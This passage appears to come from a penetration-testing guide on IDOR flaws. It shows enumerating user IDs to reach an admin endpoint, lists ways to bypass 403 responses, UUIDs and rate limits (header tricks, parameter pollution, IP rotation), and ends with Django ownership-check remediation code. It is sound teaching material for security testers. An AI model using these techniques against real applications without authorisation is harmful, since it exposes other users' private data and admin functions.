GET /api/user/1 â†’ {"role": "user", "id": 1}
GET /api/user/2 â†’ {"role": "user", "id": 2}
GET /api/user/3 â†’ {"role": "admin", "id": 3}

# Step 2: Access admin functions with discovered ID
GET /api/admin/dashboard?userId=3 HTTP/1.1
Cookie: session=regular_user_session

# If accessible: Vertical privilege escalation achieved
```

## Troubleshooting

### Issue: All Requests Return 403 Forbidden
**Cause**: Server-side access control is implemented
**Solution**:
```
# Try alternative attack vectors:
1. HTTP method switching (GET â†’ POST â†’ PUT)
2. Add X-Original-URL or X-Rewrite-URL headers
3. Try parameter pollution: ?id=1001&id=1000
4. URL encoding variations: %31%30%30%30 for "1000"
5. Case variations for string IDs
```

### Issue: Application Uses UUIDs Instead of Sequential IDs
**Cause**: Randomized identifiers reduce enumeration risk
**Solution**:
```
# UUID discovery techniques:
1. Check response bodies for leaked UUIDs
2. Search JavaScript files for hardcoded UUIDs
3. Check API responses that list multiple objects
4. Look for UUID patterns in error messages
5. Try UUID v1 (time-based) prediction if applicable
```

### Issue: Session Token Bound to User
**Cause**: Application validates session against requested resource
**Solution**:
```
# Advanced bypass attempts:
1. Test for IDOR in unauthenticated endpoints
2. Check password reset/email verification flows
3. Look for IDOR in file upload/download
4. Test API versioning: /api/v1/ vs /api/v2/
5. Check mobile API endpoints (often less protected)
```

### Issue: Rate Limiting Blocks Enumeration
**Cause**: Application implements request throttling
**Solution**:
```
# Bypass techniques:
1. Add delays between requests (Burp Intruder throttle)
2. Rotate IP addresses (proxy chains)
3. Target specific high-value IDs instead of full range
4. Use different endpoints for same resources
5. Test during off-peak hours
```

### Issue: Cannot Verify IDOR Impact
**Cause**: Response doesn't clearly indicate data ownership
**Solution**:
```
# Verification methods:
1. Create unique identifiable data in victim account
2. Look for PII markers (name, email) in responses
3. Compare response lengths between users
4. Check for timing differences in responses
5. Use secondary indicators (creation dates, metadata)
```

## Remediation Guidance

### Implement Proper Access Control
```python
# Django example - validate ownership
def update_address(request, address_id):
    address = Address.objects.get(id=address_id)
    
    # Verify ownership before allowing update
    if address.user != request.user:
        return HttpResponseForbidden("Unauthorized")
    
    # Proceed with update
    address.update(request.data)
```

### Use Indirect References
```python
# Instead of: /api/address/123
# Use: /api/address/current-user/billing

def get_address(request):
    # Always filter by authenticated user
    address = Address.objects.filter(user=request.user).first()
    return address
```

### Server-Side Validation
```python
# Always validate on server, never trust client input
def download_receipt(request, receipt_id):
    receipt = Receipt.objects.filter(
        id=receipt_id,
        user=request.user  # Critical: filter by current user
    ).first()
    
    if not receipt:
        return HttpResponseNotFound()
    
    return FileResponse(receipt.file)
```
